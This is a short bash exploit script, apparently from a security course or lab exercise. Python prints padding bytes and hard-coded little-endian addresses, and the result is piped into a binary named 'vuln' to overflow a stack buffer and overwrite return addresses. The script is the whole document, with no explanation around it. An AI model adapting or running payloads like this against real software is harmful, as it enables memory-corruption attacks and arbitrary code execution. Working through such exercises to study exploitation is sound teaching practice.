#!/usr/bin/env bash
echo -en $(python -c "print ('\x41' * 418 + '\xe4\x88\xff\x43'+'\x41'*420 + '\x30\xb3\xe5\xe0'+ '\x41'* 5)") | /task1/s1817972/vuln
